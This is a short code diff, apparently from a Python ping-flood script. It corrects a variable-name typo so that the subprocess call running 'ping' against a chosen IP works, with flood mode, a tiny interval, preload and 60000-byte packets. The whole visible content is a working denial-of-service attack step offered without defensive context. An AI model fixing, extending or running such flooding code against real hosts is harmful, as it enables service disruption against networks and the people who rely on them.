@@ -35,7 +35,7 @@ else:
 print(f"Flooding {IPToFlood}...")
 
 signal.signal(signal.SIGINT, sigint_handler)
-subprocess.run(["ping", ipToFlood, "-t 1", "-i .01", "-l 3", "-f", "-W 0", "-s 60000"])
+subprocess.run(["ping", IPToFlood, "-t 1", "-i .01", "-l 3", "-f", "-W 0", "-s 60000"])
 
 
 
